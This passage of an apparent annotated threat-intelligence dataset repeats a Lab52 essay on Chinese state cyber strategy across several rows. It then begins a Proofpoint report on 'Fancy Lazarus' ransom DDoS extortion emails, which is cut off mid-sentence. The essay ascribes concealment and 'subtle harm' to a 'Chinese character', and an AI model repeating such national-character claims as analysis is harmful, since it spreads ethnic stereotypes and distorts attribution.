empire that exists. The historical endurance of the Chinese empire has not been based solely on military victories, but on its peculiar way of understanding resistance to foreign invasion. As an example, the Qing Dynasty, the last Chinese dynasty that ruled between 1644 and 1912, was founded by the Aisin-Gioro clan of Manchuria (the Manchus are currently an ethnic minority) and not by the Chinese population as it could be though. Similarly, the Yuan dynasty (1279-1368) was founded by Mongol invaders, heirs to the legacy of Genghis Khan. Despite this, the language, customs and tradition remained unchanged thanks to the Chinese bureaucratic elites, who offered their services to the invaders with the excuse of the difficulty that would supposed to control a country with such dimensions, and making the only condition to maintain their methods and language. Because of this, the second-generation of invaders would assimilate the culture, coming to be seen as outsiders by their home territories, and finally, ending up defending China’s national interests. ![](https://lab52.io/blog/wp-content/uploads/2020/04/mountain-3022908_1920-1024x682.jpg) The resistance and adaptability typical of the Chinese character towards the invader is still present, and we have witnessed the transformation of a society that in 1984 was fundamentally agricultural (40% of its GDP), and that just 35 years later dominates the technological world scenario with to the United States as well, leading the deployment of 5G by the hand of Huawei. Such achievement has occurred not only in terms of competitiveness, but also by making its technology an intrinsic part of its legacy and by putting technological development at the service of the national interest. As the comparison mentioned by the former head of the Canadian Intelligence and Security Service for Asia-Pacific, Michel Juneau-Katsua, if Western intelligence had to steal a beach, he would go at night and wait for nobody to see him to steal it. On the other hand, if Chinese intelligence had to do it, it would send a thousand tourists and on the way back they would shake their towels, day by day. Hiding in broad daylight is a concept associated with Eastern culture, because, even leaving aside large corporations such as Xiaomi or Huawei and the obvious possibility of controlling “their” devices, they have managed to install software of all kind on any computer on the planet. It is not uncommon to find binaries with Mandarin language resources or drivers signed by Chinese companies, which could potentially facilitate a campaign directed against any organization. We also have the issue of electronic devices, the global massive sale which has allowed the worldwide deployment of a potentially vulnerable network of video surveillance cameras, loudspeakers or smartbands. Meanwhile, it competes with Google and Amazon for the control of the information at home. However, China is not interested in entering the Thucydides trap through a direct confrontation against the United States, but will use, as it has done in the past, the multipolar geopolitical scenario to achieve its purposes. *If you use the enemy to defeat the enemy, you will be powerful wherever you go.* About to end the Korean War, Mao managed to gain a foothold on the international scene through a strategy very much in the line with the classic strategist Sun Tzu. In a world in which two great superpowers, the United States and the Soviet Union, fought for world hegemony, he managed to see them as equals. It faced the United States in the Taiwan Strait conflict and, almost at the same time, ideologically and geopolitically dissociated itself from the communist bloc. This position was based on the fact that none of the powers would allow the launching of nuclear weapons on Mandarin territory, and the maintenance of a public position that claimed to have no fear of such weapons. As Mao himself stated, “China has 600 million inhabitants in an area of ​​9.6 million square kilometers. The United States cannot annihilate China with a simple pile of atomic bombs. “ Exercising an active position, Mao ended up being part of the international balance with an independent voice, exerting psychological pressure on both sides through the conflicts in the Taiwan Strait and his intervention in the Vietnam War. The current world offers very good opportunities for these puppeteer performances, as the attribution of a hostile act in cyberspace is truly complex, as evidenced by the false flag operation reported by Kaspersky on OlympicDestroyer. During the 2018 South Korea Winter Olympics, the OlympicDestroyer malware paralyzed IT systems, caused outages, and brought down the organization’s websites. What is relevant about these actions is that, as detailed in the report, the tactics, techniques and procedures (TTP) were those commonly used by the Lazarous group, associated with North Korea. However, everything indicated that intentional errors had been made in order to facilitate the detection of such TTPs, stirring the international stage with a campaign with mediatic overtones. This makes more sense if we take into account that in February 2018 North Korea was surrounded by sanctions derived from its nuclear plan, specifically resolutions 2371, 2375 and 2397 adopted in 2017, which fundamentally damaged its relationship with China. Looking to the future, everything indicates that China will continue to bet on conflict resolution through operations in cyberspace, limiting its military interventions to what is strictly necessary or for propaganda purposes. The conflict in cyberspace allows, to a certain extent, to abandon Clausewitz’s theses and the understanding of confrontation as battles that begin and end, and where the enemies are defined and tangible units. The new era embraces Suntzunian theses, promoting flexibility in battle or the use of time as a weapon, concepts that are rather foreign to Western tradition. While tradition in the West has fostered heroism and the coup in the decisive moment, Chinese ideals are based on patience, subtle harm and the accumulation of advantages in a gradual way, concepts that matches perfectly in a conflict in Internet. Thus, China is comfortable with the new approach to the multinational conflict, a world whose rules play in favor of concealment, indefiniteness and confusion. Actually, its rules. References <https://www.fireeye.com/blog/threat-research/2013/02/mandiant-exposes-apt1-chinas-cyber-espionage-units.html> <https://www.elmundo.es/internacional/2015/11/25/5654c172268e3eaa7e8b460f.html> On China –Henry Kissinger Principles of War for Cyberspace – Steven E. Cahanin <https://www.kaspersky.com/about/press-releases/2018_the-olympic-false-flag>"
annoctr,annoctr/AnnoCTR/text/train/lab52_2020-04-14_china-from-culture-to-conflict.txt,lab52_2020-04-14_china-from-culture-to-conflict,G0006,"China: From culture to conflict in the cyberspace April 14, 2020 Since in 2013 the US cybersecurity consultancy Mandiant published its famous report about APT1, showing its links with different agencies presumably associated with the Chinese government, the news about its actions in cyberspace has been significantly increased. Among others, we find APT15, APT27 or Winnti Group (APT41); the US DoJ’s allegations of cyber espionage towards five Chinese military members associated with the APT1 group; the links that the FBI has established between Zhu Hua and Zhang Shilong and APT10; or the alleged link of PLA unit 61398 (People’s Liberations Army) with APT1. With the permission of Russia and its popular operation against the DNC, China has become the main actor in cyberspace, developing an uncountable number of operations against all kind of sectors as: IT, military or naval industries and different governmental organizations. Sometimes using more sophisticated malware, and sometimes less, but more and more with its own seal linked to its extensive tradition. According to traditional ancient texts, Chinese civilization dates back more than 4,000 years with the first Xia dynasty. Due to the continuity and strength of its political and social structure, the protection of its historical and cultural legacy and the practically null western influence until the 19th century, the Chinese Empire is considered the oldest empire that exists. The historical endurance of the Chinese empire has not been based solely on military victories, but on its peculiar way of understanding resistance to foreign invasion. As an example, the Qing Dynasty, the last Chinese dynasty that ruled between 1644 and 1912, was founded by the Aisin-Gioro clan of Manchuria (the Manchus are currently an ethnic minority) and not by the Chinese population as it could be though. Similarly, the Yuan dynasty (1279-1368) was founded by Mongol invaders, heirs to the legacy of Genghis Khan. Despite this, the language, customs and tradition remained unchanged thanks to the Chinese bureaucratic elites, who offered their services to the invaders with the excuse of the difficulty that would supposed to control a country with such dimensions, and making the only condition to maintain their methods and language. Because of this, the second-generation of invaders would assimilate the culture, coming to be seen as outsiders by their home territories, and finally, ending up defending China’s national interests. ![](https://lab52.io/blog/wp-content/uploads/2020/04/mountain-3022908_1920-1024x682.jpg) The resistance and adaptability typical of the Chinese character towards the invader is still present, and we have witnessed the transformation of a society that in 1984 was fundamentally agricultural (40% of its GDP), and that just 35 years later dominates the technological world scenario with to the United States as well, leading the deployment of 5G by the hand of Huawei. Such achievement has occurred not only in terms of competitiveness, but also by making its technology an intrinsic part of its legacy and by putting technological development at the service of the national interest. As the comparison mentioned by the former head of the Canadian Intelligence and Security Service for Asia-Pacific, Michel Juneau-Katsua, if Western intelligence had to steal a beach, he would go at night and wait for nobody to see him to steal it. On the other hand, if Chinese intelligence had to do it, it would send a thousand tourists and on the way back they would shake their towels, day by day. Hiding in broad daylight is a concept associated with Eastern culture, because, even leaving aside large corporations such as Xiaomi or Huawei and the obvious possibility of controlling “their” devices, they have managed to install software of all kind on any computer on the planet. It is not uncommon to find binaries with Mandarin language resources or drivers signed by Chinese companies, which could potentially facilitate a campaign directed against any organization. We also have the issue of electronic devices, the global massive sale which has allowed the worldwide deployment of a potentially vulnerable network of video surveillance cameras, loudspeakers or smartbands. Meanwhile, it competes with Google and Amazon for the control of the information at home. However, China is not interested in entering the Thucydides trap through a direct confrontation against the United States, but will use, as it has done in the past, the multipolar geopolitical scenario to achieve its purposes. *If you use the enemy to defeat the enemy, you will be powerful wherever you go.* About to end the Korean War, Mao managed to gain a foothold on the international scene through a strategy very much in the line with the classic strategist Sun Tzu. In a world in which two great superpowers, the United States and the Soviet Union, fought for world hegemony, he managed to see them as equals. It faced the United States in the Taiwan Strait conflict and, almost at the same time, ideologically and geopolitically dissociated itself from the communist bloc. This position was based on the fact that none of the powers would allow the launching of nuclear weapons on Mandarin territory, and the maintenance of a public position that claimed to have no fear of such weapons. As Mao himself stated, “China has 600 million inhabitants in an area of ​​9.6 million square kilometers. The United States cannot annihilate China with a simple pile of atomic bombs. “ Exercising an active position, Mao ended up being part of the international balance with an independent voice, exerting psychological pressure on both sides through the conflicts in the Taiwan Strait and his intervention in the Vietnam War. The current world offers very good opportunities for these puppeteer performances, as the attribution of a hostile act in cyberspace is truly complex, as evidenced by the false flag operation reported by Kaspersky on OlympicDestroyer. During the 2018 South Korea Winter Olympics, the OlympicDestroyer malware paralyzed IT systems, caused outages, and brought down the organization’s websites. What is relevant about these actions is that, as detailed in the report, the tactics, techniques and procedures (TTP) were those commonly used by the Lazarous group, associated with North Korea. However, everything indicated that intentional errors had been made in order to facilitate the detection of such TTPs, stirring the international stage with a campaign with mediatic overtones. This makes more sense if we take into account that in February 2018 North Korea was surrounded by sanctions derived from its nuclear plan, specifically resolutions 2371, 2375 and 2397 adopted in 2017, which fundamentally damaged its relationship with China. Looking to the future, everything indicates that China will continue to bet on conflict resolution through operations in cyberspace, limiting its military interventions to what is strictly necessary or for propaganda purposes. The conflict in cyberspace allows, to a certain extent, to abandon Clausewitz’s theses and the understanding of confrontation as battles that begin and end, and where the enemies are defined and tangible units. The new era embraces Suntzunian theses, promoting flexibility in battle or the use of time as a weapon, concepts that are rather foreign to Western tradition. While tradition in the West has fostered heroism and the coup in the decisive moment, Chinese ideals are based on patience, subtle harm and the accumulation of advantages in a gradual way, concepts that matches perfectly in a conflict in Internet. Thus, China is comfortable with the new approach to the multinational conflict, a world whose rules play in favor of concealment, indefiniteness and confusion. Actually, its rules. References <https://www.fireeye.com/blog/threat-research/2013/02/mandiant-exposes-apt1-chinas-cyber-espionage-units.html> <https://www.elmundo.es/internacional/2015/11/25/5654c172268e3eaa7e8b460f.html> On China –Henry Kissinger Principles of War for Cyberspace – Steven E. Cahanin <https://www.kaspersky.com/about/press-releases/2018_the-olympic-false-flag>"
annoctr,annoctr/AnnoCTR/text/train/lab52_2020-04-14_china-from-culture-to-conflict.txt,lab52_2020-04-14_china-from-culture-to-conflict,G0032,"China: From culture to conflict in the cyberspace April 14, 2020 Since in 2013 the US cybersecurity consultancy Mandiant published its famous report about APT1, showing its links with different agencies presumably associated with the Chinese government, the news about its actions in cyberspace has been significantly increased. Among others, we find APT15, APT27 or Winnti Group (APT41); the US DoJ’s allegations of cyber espionage towards five Chinese military members associated with the APT1 group; the links that the FBI has established between Zhu Hua and Zhang Shilong and APT10; or the alleged link of PLA unit 61398 (People’s Liberations Army) with APT1. With the permission of Russia and its popular operation against the DNC, China has become the main actor in cyberspace, developing an uncountable number of operations against all kind of sectors as: IT, military or naval industries and different governmental organizations. Sometimes using more sophisticated malware, and sometimes less, but more and more with its own seal linked to its extensive tradition. According to traditional ancient texts, Chinese civilization dates back more than 4,000 years with the first Xia dynasty. Due to the continuity and strength of its political and social structure, the protection of its historical and cultural legacy and the practically null western influence until the 19th century, the Chinese Empire is considered the oldest empire that exists. The historical endurance of the Chinese empire has not been based solely on military victories, but on its peculiar way of understanding resistance to foreign invasion. As an example, the Qing Dynasty, the last Chinese dynasty that ruled between 1644 and 1912, was founded by the Aisin-Gioro clan of Manchuria (the Manchus are currently an ethnic minority) and not by the Chinese population as it could be though. Similarly, the Yuan dynasty (1279-1368) was founded by Mongol invaders, heirs to the legacy of Genghis Khan. Despite this, the language, customs and tradition remained unchanged thanks to the Chinese bureaucratic elites, who offered their services to the invaders with the excuse of the difficulty that would supposed to control a country with such dimensions, and making the only condition to maintain their methods and language. Because of this, the second-generation of invaders would assimilate the culture, coming to be seen as outsiders by their home territories, and finally, ending up defending China’s national interests. ![](https://lab52.io/blog/wp-content/uploads/2020/04/mountain-3022908_1920-1024x682.jpg) The resistance and adaptability typical of the Chinese character towards the invader is still present, and we have witnessed the transformation of a society that in 1984 was fundamentally agricultural (40% of its GDP), and that just 35 years later dominates the technological world scenario with to the United States as well, leading the deployment of 5G by the hand of Huawei. Such achievement has occurred not only in terms of competitiveness, but also by making its technology an intrinsic part of its legacy and by putting technological development at the service of the national interest. As the comparison mentioned by the former head of the Canadian Intelligence and Security Service for Asia-Pacific, Michel Juneau-Katsua, if Western intelligence had to steal a beach, he would go at night and wait for nobody to see him to steal it. On the other hand, if Chinese intelligence had to do it, it would send a thousand tourists and on the way back they would shake their towels, day by day. Hiding in broad daylight is a concept associated with Eastern culture, because, even leaving aside large corporations such as Xiaomi or Huawei and the obvious possibility of controlling “their” devices, they have managed to install software of all kind on any computer on the planet. It is not uncommon to find binaries with Mandarin language resources or drivers signed by Chinese companies, which could potentially facilitate a campaign directed against any organization. We also have the issue of electronic devices, the global massive sale which has allowed the worldwide deployment of a potentially vulnerable network of video surveillance cameras, loudspeakers or smartbands. Meanwhile, it competes with Google and Amazon for the control of the information at home. However, China is not interested in entering the Thucydides trap through a direct confrontation against the United States, but will use, as it has done in the past, the multipolar geopolitical scenario to achieve its purposes. *If you use the enemy to defeat the enemy, you will be powerful wherever you go.* About to end the Korean War, Mao managed to gain a foothold on the international scene through a strategy very much in the line with the classic strategist Sun Tzu. In a world in which two great superpowers, the United States and the Soviet Union, fought for world hegemony, he managed to see them as equals. It faced the United States in the Taiwan Strait conflict and, almost at the same time, ideologically and geopolitically dissociated itself from the communist bloc. This position was based on the fact that none of the powers would allow the launching of nuclear weapons on Mandarin territory, and the maintenance of a public position that claimed to have no fear of such weapons. As Mao himself stated, “China has 600 million inhabitants in an area of ​​9.6 million square kilometers. The United States cannot annihilate China with a simple pile of atomic bombs. “ Exercising an active position, Mao ended up being part of the international balance with an independent voice, exerting psychological pressure on both sides through the conflicts in the Taiwan Strait and his intervention in the Vietnam War. The current world offers very good opportunities for these puppeteer performances, as the attribution of a hostile act in cyberspace is truly complex, as evidenced by the false flag operation reported by Kaspersky on OlympicDestroyer. During the 2018 South Korea Winter Olympics, the OlympicDestroyer malware paralyzed IT systems, caused outages, and brought down the organization’s websites. What is relevant about these actions is that, as detailed in the report, the tactics, techniques and procedures (TTP) were those commonly used by the Lazarous group, associated with North Korea. However, everything indicated that intentional errors had been made in order to facilitate the detection of such TTPs, stirring the international stage with a campaign with mediatic overtones. This makes more sense if we take into account that in February 2018 North Korea was surrounded by sanctions derived from its nuclear plan, specifically resolutions 2371, 2375 and 2397 adopted in 2017, which fundamentally damaged its relationship with China. Looking to the future, everything indicates that China will continue to bet on conflict resolution through operations in cyberspace, limiting its military interventions to what is strictly necessary or for propaganda purposes. The conflict in cyberspace allows, to a certain extent, to abandon Clausewitz’s theses and the understanding of confrontation as battles that begin and end, and where the enemies are defined and tangible units. The new era embraces Suntzunian theses, promoting flexibility in battle or the use of time as a weapon, concepts that are rather foreign to Western tradition. While tradition in the West has fostered heroism and the coup in the decisive moment, Chinese ideals are based on patience, subtle harm and the accumulation of advantages in a gradual way, concepts that matches perfectly in a conflict in Internet. Thus, China is comfortable with the new approach to the multinational conflict, a world whose rules play in favor of concealment, indefiniteness and confusion. Actually, its rules. References <https://www.fireeye.com/blog/threat-research/2013/02/mandiant-exposes-apt1-chinas-cyber-espionage-units.html> <https://www.elmundo.es/internacional/2015/11/25/5654c172268e3eaa7e8b460f.html> On China –Henry Kissinger Principles of War for Cyberspace – Steven E. Cahanin <https://www.kaspersky.com/about/press-releases/2018_the-olympic-false-flag>"
annoctr,annoctr/AnnoCTR/text/train/lab52_2020-04-14_china-from-culture-to-conflict.txt,lab52_2020-04-14_china-from-culture-to-conflict,G0045,"China: From culture to conflict in the cyberspace April 14, 2020 Since in 2013 the US cybersecurity consultancy Mandiant published its famous report about APT1, showing its links with different agencies presumably associated with the Chinese government, the news about its actions in cyberspace has been significantly increased. Among others, we find APT15, APT27 or Winnti Group (APT41); the US DoJ’s allegations of cyber espionage towards five Chinese military members associated with the APT1 group; the links that the FBI has established between Zhu Hua and Zhang Shilong and APT10; or the alleged link of PLA unit 61398 (People’s Liberations Army) with APT1. With the permission of Russia and its popular operation against the DNC, China has become the main actor in cyberspace, developing an uncountable number of operations against all kind of sectors as: IT, military or naval industries and different governmental organizations. Sometimes using more sophisticated malware, and sometimes less, but more and more with its own seal linked to its extensive tradition. According to traditional ancient texts, Chinese civilization dates back more than 4,000 years with the first Xia dynasty. Due to the continuity and strength of its political and social structure, the protection of its historical and cultural legacy and the practically null western influence until the 19th century, the Chinese Empire is considered the oldest empire that exists. The historical endurance of the Chinese empire has not been based solely on military victories, but on its peculiar way of understanding resistance to foreign invasion. As an example, the Qing Dynasty, the last Chinese dynasty that ruled between 1644 and 1912, was founded by the Aisin-Gioro clan of Manchuria (the Manchus are currently an ethnic minority) and not by the Chinese population as it could be though. Similarly, the Yuan dynasty (1279-1368) was founded by Mongol invaders, heirs to the legacy of Genghis Khan. Despite this, the language, customs and tradition remained unchanged thanks to the Chinese bureaucratic elites, who offered their services to the invaders with the excuse of the difficulty that would supposed to control a country with such dimensions, and making the only condition to maintain their methods and language. Because of this, the second-generation of invaders would assimilate the culture, coming to be seen as outsiders by their home territories, and finally, ending up defending China’s national interests. ![](https://lab52.io/blog/wp-content/uploads/2020/04/mountain-3022908_1920-1024x682.jpg) The resistance and adaptability typical of the Chinese character towards the invader is still present, and we have witnessed the transformation of a society that in 1984 was fundamentally agricultural (40% of its GDP), and that just 35 years later dominates the technological world scenario with to the United States as well, leading the deployment of 5G by the hand of Huawei. Such achievement has occurred not only in terms of competitiveness, but also by making its technology an intrinsic part of its legacy and by putting technological development at the service of the national interest. As the comparison mentioned by the former head of the Canadian Intelligence and Security Service for Asia-Pacific, Michel Juneau-Katsua, if Western intelligence had to steal a beach, he would go at night and wait for nobody to see him to steal it. On the other hand, if Chinese intelligence had to do it, it would send a thousand tourists and on the way back they would shake their towels, day by day. Hiding in broad daylight is a concept associated with Eastern culture, because, even leaving aside large corporations such as Xiaomi or Huawei and the obvious possibility of controlling “their” devices, they have managed to install software of all kind on any computer on the planet. It is not uncommon to find binaries with Mandarin language resources or drivers signed by Chinese companies, which could potentially facilitate a campaign directed against any organization. We also have the issue of electronic devices, the global massive sale which has allowed the worldwide deployment of a potentially vulnerable network of video surveillance cameras, loudspeakers or smartbands. Meanwhile, it competes with Google and Amazon for the control of the information at home. However, China is not interested in entering the Thucydides trap through a direct confrontation against the United States, but will use, as it has done in the past, the multipolar geopolitical scenario to achieve its purposes. *If you use the enemy to defeat the enemy, you will be powerful wherever you go.* About to end the Korean War, Mao managed to gain a foothold on the international scene through a strategy very much in the line with the classic strategist Sun Tzu. In a world in which two great superpowers, the United States and the Soviet Union, fought for world hegemony, he managed to see them as equals. It faced the United States in the Taiwan Strait conflict and, almost at the same time, ideologically and geopolitically dissociated itself from the communist bloc. This position was based on the fact that none of the powers would allow the launching of nuclear weapons on Mandarin territory, and the maintenance of a public position that claimed to have no fear of such weapons. As Mao himself stated, “China has 600 million inhabitants in an area of ​​9.6 million square kilometers. The United States cannot annihilate China with a simple pile of atomic bombs. “ Exercising an active position, Mao ended up being part of the international balance with an independent voice, exerting psychological pressure on both sides through the conflicts in the Taiwan Strait and his intervention in the Vietnam War. The current world offers very good opportunities for these puppeteer performances, as the attribution of a hostile act in cyberspace is truly complex, as evidenced by the false flag operation reported by Kaspersky on OlympicDestroyer. During the 2018 South Korea Winter Olympics, the OlympicDestroyer malware paralyzed IT systems, caused outages, and brought down the organization’s websites. What is relevant about these actions is that, as detailed in the report, the tactics, techniques and procedures (TTP) were those commonly used by the Lazarous group, associated with North Korea. However, everything indicated that intentional errors had been made in order to facilitate the detection of such TTPs, stirring the international stage with a campaign with mediatic overtones. This makes more sense if we take into account that in February 2018 North Korea was surrounded by sanctions derived from its nuclear plan, specifically resolutions 2371, 2375 and 2397 adopted in 2017, which fundamentally damaged its relationship with China. Looking to the future, everything indicates that China will continue to bet on conflict resolution through operations in cyberspace, limiting its military interventions to what is strictly necessary or for propaganda purposes. The conflict in cyberspace allows, to a certain extent, to abandon Clausewitz’s theses and the understanding of confrontation as battles that begin and end, and where the enemies are defined and tangible units. The new era embraces Suntzunian theses, promoting flexibility in battle or the use of time as a weapon, concepts that are rather foreign to Western tradition. While tradition in the West has fostered heroism and the coup in the decisive moment, Chinese ideals are based on patience, subtle harm and the accumulation of advantages in a gradual way, concepts that matches perfectly in a conflict in Internet. Thus, China is comfortable with the new approach to the multinational conflict, a world whose rules play in favor of concealment, indefiniteness and confusion. Actually, its rules. References <https://www.fireeye.com/blog/threat-research/2013/02/mandiant-exposes-apt1-chinas-cyber-espionage-units.html> <https://www.elmundo.es/internacional/2015/11/25/5654c172268e3eaa7e8b460f.html> On China –Henry Kissinger Principles of War for Cyberspace – Steven E. Cahanin <https://www.kaspersky.com/about/press-releases/2018_the-olympic-false-flag>"
annoctr,annoctr/AnnoCTR/text/train/lab52_2020-04-14_china-from-culture-to-conflict.txt,lab52_2020-04-14_china-from-culture-to-conflict,G0096,"China: From culture to conflict in the cyberspace April 14, 2020 Since in 2013 the US cybersecurity consultancy Mandiant published its famous report about APT1, showing its links with different agencies presumably associated with the Chinese government, the news about its actions in cyberspace has been significantly increased. Among others, we find APT15, APT27 or Winnti Group (APT41); the US DoJ’s allegations of cyber espionage towards five Chinese military members associated with the APT1 group; the links that the FBI has established between Zhu Hua and Zhang Shilong and APT10; or the alleged link of PLA unit 61398 (People’s Liberations Army) with APT1. With the permission of Russia and its popular operation against the DNC, China has become the main actor in cyberspace, developing an uncountable number of operations against all kind of sectors as: IT, military or naval industries and different governmental organizations. Sometimes using more sophisticated malware, and sometimes less, but more and more with its own seal linked to its extensive tradition. According to traditional ancient texts, Chinese civilization dates back more than 4,000 years with the first Xia dynasty. Due to the continuity and strength of its political and social structure, the protection of its historical and cultural legacy and the practically null western influence until the 19th century, the Chinese Empire is considered the oldest empire that exists. The historical endurance of the Chinese empire has not been based solely on military victories, but on its peculiar way of understanding resistance to foreign invasion. As an example, the Qing Dynasty, the last Chinese dynasty that ruled between 1644 and 1912, was founded by the Aisin-Gioro clan of Manchuria (the Manchus are currently an ethnic minority) and not by the Chinese population as it could be though. Similarly, the Yuan dynasty (1279-1368) was founded by Mongol invaders, heirs to the legacy of Genghis Khan. Despite this, the language, customs and tradition remained unchanged thanks to the Chinese bureaucratic elites, who offered their services to the invaders with the excuse of the difficulty that would supposed to control a country with such dimensions, and making the only condition to maintain their methods and language. Because of this, the second-generation of invaders would assimilate the culture, coming to be seen as outsiders by their home territories, and finally, ending up defending China’s national interests. ![](https://lab52.io/blog/wp-content/uploads/2020/04/mountain-3022908_1920-1024x682.jpg) The resistance and adaptability typical of the Chinese character towards the invader is still present, and we have witnessed the transformation of a society that in 1984 was fundamentally agricultural (40% of its GDP), and that just 35 years later dominates the technological world scenario with to the United States as well, leading the deployment of 5G by the hand of Huawei. Such achievement has occurred not only in terms of competitiveness, but also by making its technology an intrinsic part of its legacy and by putting technological development at the service of the national interest. As the comparison mentioned by the former head of the Canadian Intelligence and Security Service for Asia-Pacific, Michel Juneau-Katsua, if Western intelligence had to steal a beach, he would go at night and wait for nobody to see him to steal it. On the other hand, if Chinese intelligence had to do it, it would send a thousand tourists and on the way back they would shake their towels, day by day. Hiding in broad daylight is a concept associated with Eastern culture, because, even leaving aside large corporations such as Xiaomi or Huawei and the obvious possibility of controlling “their” devices, they have managed to install software of all kind on any computer on the planet. It is not uncommon to find binaries with Mandarin language resources or drivers signed by Chinese companies, which could potentially facilitate a campaign directed against any organization. We also have the issue of electronic devices, the global massive sale which has allowed the worldwide deployment of a potentially vulnerable network of video surveillance cameras, loudspeakers or smartbands. Meanwhile, it competes with Google and Amazon for the control of the information at home. However, China is not interested in entering the Thucydides trap through a direct confrontation against the United States, but will use, as it has done in the past, the multipolar geopolitical scenario to achieve its purposes. *If you use the enemy to defeat the enemy, you will be powerful wherever you go.* About to end the Korean War, Mao managed to gain a foothold on the international scene through a strategy very much in the line with the classic strategist Sun Tzu. In a world in which two great superpowers, the United States and the Soviet Union, fought for world hegemony, he managed to see them as equals. It faced the United States in the Taiwan Strait conflict and, almost at the same time, ideologically and geopolitically dissociated itself from the communist bloc. This position was based on the fact that none of the powers would allow the launching of nuclear weapons on Mandarin territory, and the maintenance of a public position that claimed to have no fear of such weapons. As Mao himself stated, “China has 600 million inhabitants in an area of ​​9.6 million square kilometers. The United States cannot annihilate China with a simple pile of atomic bombs. “ Exercising an active position, Mao ended up being part of the international balance with an independent voice, exerting psychological pressure on both sides through the conflicts in the Taiwan Strait and his intervention in the Vietnam War. The current world offers very good opportunities for these puppeteer performances, as the attribution of a hostile act in cyberspace is truly complex, as evidenced by the false flag operation reported by Kaspersky on OlympicDestroyer. During the 2018 South Korea Winter Olympics, the OlympicDestroyer malware paralyzed IT systems, caused outages, and brought down the organization’s websites. What is relevant about these actions is that, as detailed in the report, the tactics, techniques and procedures (TTP) were those commonly used by the Lazarous group, associated with North Korea. However, everything indicated that intentional errors had been made in order to facilitate the detection of such TTPs, stirring the international stage with a campaign with mediatic overtones. This makes more sense if we take into account that in February 2018 North Korea was surrounded by sanctions derived from its nuclear plan, specifically resolutions 2371, 2375 and 2397 adopted in 2017, which fundamentally damaged its relationship with China. Looking to the future, everything indicates that China will continue to bet on conflict resolution through operations in cyberspace, limiting its military interventions to what is strictly necessary or for propaganda purposes. The conflict in cyberspace allows, to a certain extent, to abandon Clausewitz’s theses and the understanding of confrontation as battles that begin and end, and where the enemies are defined and tangible units. The new era embraces Suntzunian theses, promoting flexibility in battle or the use of time as a weapon, concepts that are rather foreign to Western tradition. While tradition in the West has fostered heroism and the coup in the decisive moment, Chinese ideals are based on patience, subtle harm and the accumulation of advantages in a gradual way, concepts that matches perfectly in a conflict in Internet. Thus, China is comfortable with the new approach to the multinational conflict, a world whose rules play in favor of concealment, indefiniteness and confusion. Actually, its rules. References <https://www.fireeye.com/blog/threat-research/2013/02/mandiant-exposes-apt1-chinas-cyber-espionage-units.html> <https://www.elmundo.es/internacional/2015/11/25/5654c172268e3eaa7e8b460f.html> On China –Henry Kissinger Principles of War for Cyberspace – Steven E. Cahanin <https://www.kaspersky.com/about/press-releases/2018_the-olympic-false-flag>"
annoctr,annoctr/AnnoCTR/text/train/proofpoint_2021-06-10_ransom-ddos-extortion-actor-fancy.txt,proofpoint_2021-06-10_ransom-ddos-extortion-actor-fancy,G0007,"Ransom DDoS Extortion Actor “Fancy Lazarus” Returns June 10, 2021 ### Key Takeaways * The ransom distributed denial of service extortion threat actor known as ""Fancy Lazarus"" is back, taking aim at an increasing number of industries, including the energy, financial, insurance, manufacturing, public utilities, and retail sectors. * There is no known connection between this group and the APT actors with the same names. * These latest campaigns have some differences to previous campaigns, including a change to the group's name, the amount of Bitcoin being ransomed, and variations in the email body content. * While it is not possible for organizations or companies to avoid being the target of such attacks, there are indications that most such threats either do not materialize into an actual attack or they are successfully mitigated. ### Overview As of May 12, 2021, Proofpoint researchers are tracking renewed distributed denial of service (DDoS) extortion activity targeting an increasing number of industries, including the energy, financial, insurance, manufacturing, public utilities, and retail by the threat actor “Fancy Lazarus. Proofpoint researchers have observed the activity primarily at U.S. companies or those with a global footprint. The actor took over a month-long break from April to May 2021 before returning with new campaigns that include some changes to the group’s tactics, techniques, and procedures: * New name: The group, who have previously identified themselves as “Fancy Bear”, “Lazarus,” “Lazarus Group,” and “Armada Collective,” among others, is now going by “Fancy Lazarus. There is no known connection between this group and the APT actors with the same names. * New price: The extortion emails now have adjusted ransom pricing, lowering it from ransoms as high as ten Bitcoin (BTC) to its current two BTC starting price. This change is likely to account for Bitcoin’s fluctuating value. * Variation in email content: In terms of email body content, the specific variant is reminiscent of the original variants from August 2020 with some minor changes and evolutions. It is interesting that the group is still going back and tweaking the original email, potentially indicating its effectiveness. Between August 2020 and now, however, they have tried completely different text in the emails. ### Background In mid-to-late August 2020, [Akamai](https://blogs.akamai.com/sitr/2020/08/ransom-demands-return-new-ddos-extortion-threats-from-old-actors-targeting-finance-and-retail.html) and the U.S. Federal Bureau of Investigation (FBI) [alerted](https://www.documentcloud.org/documents/7070798-FLASH-MU-000132-DD.html) organizations to a spate of ransom denial-of-service extortion emails from this group. According to the published reports, this group took aim at thousands of organizations from multiple global industry verticals. In each case the threat actor demanded Bitcoin payment or else a small-scale denial-of-service attack would be launched with a more substantial attack mere days later. ### Campaign Details The campaigns always begin with sensational emails. The current iteration, as illustrated in Figure 1, starts with an announcement of the name the group uses currently and an acknowledgement that they are targeting a specific company. They then threaten a DDoS attack in seven days, and, to prove it is not a hoax, mention a ""small attack"" that will be launched on a specific IP, subnet, or Autonomous System. The emails claim that the max attack speed will be ""2 Tbps. They also warn about potential damage to the target company’s reputation and loss of internet access at their offices almost certainly to further coerce the victim into complying with their demands. ![](data:image;base64_removed,) Figure 1. Example of current emails being sent by “Fancy Lazarus. Each of the campaigns is also characterized by the following elements: * **Recipients:** The emails are typically sent to well researched recipients, such as individuals listed as contacts in Border Gateway Protocol (BGP) or Whois information for company networks. The emailed individuals also work in areas such as communications, external relations, investor relations. Additionally, extortion emails are often sent to email aliases such as help desk, abuse, administrative contacts, or customer service. * **Email body:** There are three email variants sent to the same recipients conveying the same information, except with the email body in plain text, HTML, or as a JPG image attachment. This is a likely an attempt to evade detections. * **Sender emails:** Each sender email is different and unique to the targeted company. Previously the sender often contained “Fancy Bear,” ""F.B.,” ""Armada Collective,” ""A.C.,” ""Lazarus,” or ""Lazarus Group,"" and even at times included the targeted company’s highest-ranking person such as the CEO’s name. In the most current campaign, a random “First name Last name” format is used and the names appear fictional. * **Sender email provider:** Each email is created at one of the various free email services. * **Payment:** Proofpoint has observed ransom demands of two BTC, which roughly equated to $76,000 USD on May 26, 2021. The price doubles to four BTC after the deadline and increases by one BTC each day after that. The Bitcoin addresses are unique to each potential target. ### **Conclusion** While Proofpoint does not have visibility into the actual “Fancy Lazarus” DDoS attacks and whether they are carried out, FBI [reporting](https://www.documentcloud.org/documents/7070798-FLASH-MU-000132-DD.html) indicates that many affected companies that pass the threatened deadline either do not see any additional activity or the activity is 